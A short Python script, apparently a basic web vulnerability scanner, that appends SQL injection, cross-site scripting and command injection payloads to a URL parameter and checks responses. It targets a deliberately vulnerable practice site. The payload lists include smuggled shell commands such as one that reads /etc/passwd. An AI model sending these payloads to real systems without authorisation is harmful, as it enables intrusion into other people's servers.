import requests
import re

def check_injection(url):
    # Test for SQL injection vulnerability
    sql_payloads = ["' OR '1'='1", " OR 1=1", " OR 'a'='a"]
    for payload in sql_payloads:
        r = requests.get(url + payload)
        if "mysql" in r.text.lower():
            print(f"[SQL Injection] Vulnerable: {url + payload}")
  #          return

    # Test for XSS injection vulnerability
    xss_payloads = ["<script>alert('XSS')</script>", "javascript:alert('XSS')"]
    for payload in xss_payloads:
        r = requests.get(url + payload)
        if payload in r.text:
            print(f"[XSS Injection] Vulnerable: {url + payload}")
            return

    # Test for command injection vulnerability
    cmd_payloads = ["'; ls; ", "'; cat /etc/passwd;"]
    for payload in cmd_payloads:
        r = requests.get(url + payload)
        print("checking for rce",r)
        if "root" in r.text.lower():
            print(f"[Command Injection] Vulnerable: {url + payload}")
            return
    print(f"[No Injection] Not Vulnerable: {url}")

check_injection("http://testphp.vulnweb.com/artists.php?artist=2")
